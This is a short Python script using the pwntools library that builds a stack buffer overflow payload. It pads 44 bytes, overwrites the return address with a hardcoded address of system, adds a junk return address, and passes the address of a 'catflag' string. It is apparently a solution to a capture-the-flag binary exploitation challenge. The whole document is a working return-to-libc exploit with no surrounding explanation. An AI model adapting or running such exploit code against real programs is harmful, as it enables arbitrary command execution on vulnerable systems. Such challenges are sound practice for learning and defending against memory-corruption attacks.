from pwn import *

system = 0x80483e0
catflag  = 0x0804a030

payload = cyclic(44) + p32(system) + b'JUNK' + p32(catflag)
# JUNK is the ret adr for system function (not relevent)
print(payload)